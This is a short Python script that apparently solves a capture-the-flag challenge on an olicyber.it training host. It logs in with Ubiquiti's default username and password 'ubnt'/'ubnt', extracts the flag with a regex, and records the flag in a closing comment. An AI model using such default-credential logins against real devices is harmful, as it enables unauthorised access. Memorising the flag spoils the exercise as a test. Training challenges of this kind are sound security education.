import requests
import re

site = "http://weird-device.challs.olicyber.it/"

r = requests.post(site, data = {"username" : "ubnt", "password" : "ubnt"}).text #https://community.ui.com/questions/UAP-AC-Pro-default-password/5aec9335-bd8e-42c5-bb85-a153123c80f7
match = re.search(r'flag\{[^\}]+\}', r)
flag = match.group(0)
print(flag)

#flag{d3f4ult_cr3d3nt14ls_are_always_a_bad_idea}